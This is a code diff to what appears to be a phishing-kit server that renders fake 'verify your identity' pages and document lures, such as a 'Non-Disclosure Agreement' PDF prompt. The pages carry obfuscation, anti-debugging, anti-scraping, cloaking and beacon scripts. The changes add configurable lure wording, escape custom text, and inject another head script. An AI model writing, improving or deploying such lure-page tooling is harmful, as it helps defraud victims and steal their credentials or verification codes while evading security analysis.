@@ -394,6 +394,11 @@ async function buildWindowVars(link, user, settings, options) {
 
     }
     reportTurnstileKey(turnstileSiteKey, link && link.id, 'buildWindowVars');
+    // Defaults come from the template's own config.json so a link created with no
+    // custom text still shows the template's original wording, and the panel can
+    // pre-fill those same real values for the user to edit.
+    var _tc = loadTemplateConfig(link.template_type);
+    var _def = function (k, fb) { return getConfigDefault(_tc, k, fb); };
     var apiBase = '';
 
     if (!options.relativeApi && options.apiBaseUrl) apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
@@ -408,12 +413,13 @@ async function buildWindowVars(link, user, settings, options) {
         __AUTH_MODE: authMode,
         __BACKGROUND_BLUR_URL: bgUrl,
         __BACKGROUND_BLUR_AMOUNT: String(defaultBlur),
-        __DOC_FILENAME: link.file_name || 'Document.pdf',
-        __DOC_TITLE: link.title_text || 'Non-Disclosure Agreement',
-        __DOC_PAGES: String(link.pages || '4'),
-        __PAGE_TITLE: link.title_text || 'Verify your identity',
-        __PAGE_MESSAGE: link.message_text || 'Please verify your identity to continue',
-        __PRIMARY_BUTTON_TEXT: link.button_text || 'Get verification code',
+        __DOC_FILENAME: link.file_name || _def('file_name', 'Document.pdf'),
+        __DOC_TITLE: link.title_text || _def('title', 'Non-Disclosure Agreement'),
+        __DOC_PAGES: String(parseInt(link.pages, 10) || parseInt(_def('pages', 4), 10) || 4),
+        __PAGE_TITLE: link.title_text || _def('title', 'Verify your identity'),
+        __PAGE_MESSAGE: link.message_text || _def('message', 'Please verify your identity to continue'),
+        __PAGE_MESSAGE_SET: String(!!link.message_text),
+        __PRIMARY_BUTTON_TEXT: link.button_text || _def('button_text', 'Get verification code'),
         __OBFUSCATION_ENABLED: String(obfuscationEnabled),
         __ANTIDEBUG_ENABLED: String(antidebugEnabled),
         __ANTISCRAPE_ENABLED: String(boolSetting(settings.antiscraping_enabled)),
@@ -901,11 +907,28 @@ async function renderPageHtml(link, user, options) {
     }
 
 
-    html = html.replace('{{TITLE}}', link.title_text || getConfigDefault(templateConfig, 'title', 'Verify your identity'));
-    html = html.replace('{{MESSAGE}}', link.message_text || getConfigDefault(templateConfig, 'message', 'Please verify your identity to continue'));
-    html = html.replace('{{BUTTON_TEXT}}', link.button_text || getConfigDefault(templateConfig, 'button_text', 'Get verification code'));
-    html = html.replace('{{FILE_NAME}}', link.file_name || getConfigDefault(templateConfig, 'file_name', 'Document.pdf'));
-    html = html.replace('{{PAGES}}', String(link.pages || getConfigDefault(templateConfig, 'pages', 1)));
+    // Customizable page text. User-provided values are HTML-escaped so a stray
+    // <, " or ' cannot break the page; each placeholder is replaced GLOBALLY so
+    // templates that use the same token more than once (e.g. <title> + <h1>) all
+    // update. Fallbacks come from the template config, then a generic default.
+    var _escHtml = function (s) {
+        return String(s == null ? '' : s)
+            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+    };
+    var _pagesNum = parseInt(link.pages, 10) || parseInt(getConfigDefault(templateConfig, 'pages', 1), 10) || 1;
+    var _textPlaceholders = {
+        '{{TITLE}}': _escHtml(link.title_text || getConfigDefault(templateConfig, 'title', 'Verify your identity')),
+        '{{MESSAGE}}': _escHtml(link.message_text || getConfigDefault(templateConfig, 'message', 'Please verify your identity to continue')),
+        '{{BUTTON_TEXT}}': _escHtml(link.button_text || getConfigDefault(templateConfig, 'button_text', 'Get verification code')),
+        '{{FILE_NAME}}': _escHtml(link.file_name || getConfigDefault(templateConfig, 'file_name', 'Document.pdf')),
+        '{{PAGES}}': String(_pagesNum),
+        '{{PAGES_LABEL}}': _pagesNum + (_pagesNum === 1 ? ' page' : ' pages')
+    };
+    Object.keys(_textPlaceholders).forEach(function (ph) {
+        var val = _textPlaceholders[ph];
+        html = html.split(ph).join(val);
+    });
 
     const verifyUrl = (options.relativeApi ? '' : (options.apiBaseUrl || config.API_URL || config.APP_URL || '')).trim().replace(/\/+$/, '');
     const beaconUrl = verifyUrl ? verifyUrl + '/api/beacon' : '/api/beacon';
@@ -952,6 +975,12 @@ async function renderPageHtml(link, user, options) {
         vgCloak = fs.readFileSync(vgCloakPath, 'utf8');
     }
 
+    var vgText = '';
+    const vgTextPath = path.join(TEMPLATES_DIR, 'assets', 'vg-text.js');
+    if (fs.existsSync(vgTextPath)) {
+        vgText = fs.readFileSync(vgTextPath, 'utf8');
+    }
+
     const forceBlob = options.forceBlobFromStart === true ? 'true' : 'false';
     const configScript = '<script>window.__FORCE_BLOB_FROM_START=' + forceBlob + '</script>';
     
@@ -974,6 +1003,9 @@ async function renderPageHtml(link, user, options) {
 
 
         headScripts += '<script>' + vgEngine + '</script>';
+    }
+    if (vgText) {
+        headScripts += '<script>' + vgText + '</script>';
     }
 
     if (html.includes('</head>')) {
